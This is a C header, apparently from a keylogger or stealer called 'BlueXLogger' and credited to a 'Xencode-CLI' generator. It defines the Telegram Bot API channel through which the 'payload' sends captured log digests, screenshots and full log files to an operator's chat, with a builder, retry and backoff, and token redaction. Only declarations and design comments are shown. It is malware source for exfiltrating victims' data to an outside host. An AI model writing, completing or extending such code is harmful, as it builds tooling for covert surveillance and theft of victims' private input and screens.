/*============================================================================
 * BlueXLogger - bxl_telegram.h
 * Telegram Bot API delivery channel.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Why a second channel
 * --------------------
 * Gmail delivery needs 2-Step Verification, an App Password, and a working
 * understanding of why an ordinary account password is rejected. Telegram
 * needs a bot token from @BotFather and a chat id - two strings an operator
 * can obtain in a minute, with no mail-provider policy in the way. Both are
 * supported; the channel is a configuration choice, not a build choice.
 *
 * Message shape
 * -------------
 * A log digest goes out as one or more sendMessage calls with HTML parse
 * mode, each chunk self-contained so that a split never leaves an unclosed
 * tag. Screenshots go out as an album (sendMediaGroup) when there are
 * between two and ten of them, as a single sendPhoto when there is one, and
 * as sendDocument when a file exceeds the 10 MB photo ceiling or the media
 * group limit would be exceeded.
 *==========================================================================*/
#ifndef BXL_TELEGRAM_H
#define BXL_TELEGRAM_H

#include "bxl_common.h"
#include "bxl_config.h"
#include "bxl_mime.h"

/* Telegram rejects a token that is not "<digits>:<base64ish>". The field
 * capacities live in bxl_config.h so the struct layout has one definition. */
#define BXL_TG_MAX_TOKEN   BXL_MAX_TOKEN
#define BXL_TG_MAX_CHATID  BXL_MAX_CHATID

/* Bot API hard limits, as documented. */
#define BXL_TG_MSG_LIMIT      4096   /* characters per message               */
#define BXL_TG_CAPTION_LIMIT  1024   /* characters per caption               */
#define BXL_TG_PHOTO_MAX      (10u * 1024u * 1024u)  /* sendPhoto ceiling   */
#define BXL_TG_MEDIA_GROUP_MAX 10    /* items per sendMediaGroup             */
#define BXL_TG_MEDIA_GROUP_MIN 2

/* Stages, mirroring the SMTP result so the builder can report both channels
 * with the same vocabulary. */
#define BXL_TG_STAGE_NONE       0
#define BXL_TG_STAGE_CONNECT    1
#define BXL_TG_STAGE_TLS        2
#define BXL_TG_STAGE_SEND       3
#define BXL_TG_STAGE_RESPONSE   4
#define BXL_TG_STAGE_PARSE      5
#define BXL_TG_STAGE_API        6   /* Telegram returned "ok":false         */
#define BXL_TG_STAGE_RATE_LIMIT 7   /* 429, with retry_after                */

typedef struct BxlTelegramConfig {
    char bot_token[BXL_TG_MAX_TOKEN];
    char chat_id[BXL_TG_MAX_CHATID];
    int  timeout_ms;
    int  max_attempts;      /* >= 1                                          */
    int  retry_base_ms;     /* first backoff delay                           */
    int  parse_html;        /* 1 = send with parse_mode=HTML                 */
    int  send_screenshots;  /* 0 = text only                                 */
    int  full_log_file;     /* also send the whole log as a .txt document    */
    char client_name[64];

    /* Bot API endpoint. Defaults to api.telegram.org:443. It is overridable so
     * that a self-hosted Bot API server - and the test suite's sink - can be
     * addressed without rebuilding the transport. */
    char api_host[128];
    int  api_port;
} BxlTelegramConfig;

typedef struct BxlTelegramResult {
    int  ok;
    int  attempts;
    int  stage;             /* BXL_TG_STAGE_*                                */
    int  http_status;       /* last HTTP status seen                         */
    int  api_code;          /* Telegram "error_code"                         */
    int  retry_after;       /* seconds, when the API asked us to back off    */
    char last_line[512];    /* "description" from the API, or a local reason */
    char error[512];
    bxl_u32 elapsed_ms;
} BxlTelegramResult;

/* One attachment to upload. `data` is borrowed for the duration of the call. */
typedef struct BxlTgFile {
    const void *data;
    size_t      len;
    char        filename[128];
    char        mime[64];
} BxlTgFile;

/* Human-readable stage name, for logs and dialogs. */
const wchar_t *bxl_telegram_stage_name(int stage);

/* Populate from the operator configuration. */
void bxl_telegram_config_from(const BxlConfig *cfg, BxlTelegramConfig *out);

/* Token/chat-id shape check, shared by the builder's validation and by
 * config validation. Returns BXL_TRUE when the pair looks usable. */
int bxl_telegram_token_ok(const char *token);
int bxl_telegram_chat_ok(const char *chat_id);

/* "<bot id>:AAAA…" - enough to identify which token is configured, not enough
 * to use it. Safe to write to a log or show in the builder. */
void bxl_telegram_redact(const char *token, char *out, size_t out_cch);

/* getMe: proves the token is valid and the endpoint is reachable, without
 * sending anything to the chat. */
int bxl_telegram_verify(const BxlTelegramConfig *tc, BxlTelegramResult *res);

/* Send a plain message (split across messages when it exceeds the limit).
 * Used for the builder's demo mail. */
int bxl_telegram_send_text(const BxlTelegramConfig *tc, const char *text,
                           BxlTelegramResult *res);

/* Send a file as a photo (compressed by Telegram, previewed inline). */
int bxl_telegram_send_photo(const BxlTelegramConfig *tc, const BxlTgFile *file,
                            const char *caption, BxlTelegramResult *res);

/* Send a file as a document (original bytes, no recompression). */
int bxl_telegram_send_document(const BxlTelegramConfig *tc, const BxlTgFile *file,
                               const char *caption, BxlTelegramResult *res);

/* Send 2..10 photos as one album. */
int bxl_telegram_send_media_group(const BxlTelegramConfig *tc,
                                  const BxlTgFile *files, size_t count,
                                  const char *caption,
                                  BxlTelegramResult *res);

/*
 * The delivery entry point used by the payload: a log digest as text, then
 * every attachment, choosing photo/album/document per file. Returns BXL_TRUE
 * only when every part was accepted.
 */
int bxl_telegram_send_digest(const BxlTelegramConfig *tc,
                             const char *subject,
                             const char *text,
                             const BxlTgFile *files, size_t file_count,
                             BxlTelegramResult *res);

/* True when a failure is worth retrying (transport, 5xx, 429). */
int bxl_telegram_retryable(const BxlTelegramResult *res);

#endif /* BXL_TELEGRAM_H */
